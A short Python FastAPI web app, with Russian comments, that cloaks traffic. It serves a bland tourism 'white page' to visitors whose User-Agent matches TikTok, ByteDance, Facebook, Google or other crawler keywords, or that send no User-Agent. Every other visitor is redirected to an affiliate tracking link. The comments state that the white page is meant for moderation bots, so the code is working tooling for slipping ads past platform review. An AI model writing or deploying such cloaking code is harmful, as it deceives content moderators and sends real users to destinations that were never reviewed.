from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, RedirectResponse

app = FastAPI()

# Твоя ссылка на партнерку
TARGET_URL = "https://rubik.top/click?o=2&a=1551&sub_id2=kaztvoya"

# Слова-маркеры ботов-модераторов
BOT_KEYWORDS = ['bot', 'spider', 'crawl', 'bytedance', 'tiktok', 'facebook', 'google', 'slurp']

# Белая страница (White Page) для модераторов
WHITE_PAGE_HTML = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Природа Азии</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>body { font-family: sans-serif; padding: 40px; color: #333; line-height: 1.6; }</style>
</head>
<body>
    <h1>Красивые места для туризма</h1>
    <p>В этом блоге мы обсуждаем горы, степи и озера. Отличное место для спокойного отдыха и перезагрузки.</p>
</body>
</html>
"""

@app.get("/")
async def root(request: Request):
    # Получаем User-Agent юзера
    user_agent = request.headers.get('user-agent', '').lower()
    
    # Проверяем, есть ли совпадения с черным списком
    is_bot = any(keyword in user_agent for keyword in BOT_KEYWORDS)
    
    # ЛОГИКА ДЛЯ БОТА (ИЛИ ЕСЛИ USER-AGENT ПУСТОЙ)
    if is_bot or not user_agent:
        return HTMLResponse(content=WHITE_PAGE_HTML, status_code=200)
        
    # ЛОГИКА ДЛЯ ЖИВОГО ЧЕЛОВЕКА
    return RedirectResponse(url=TARGET_URL, status_code=302)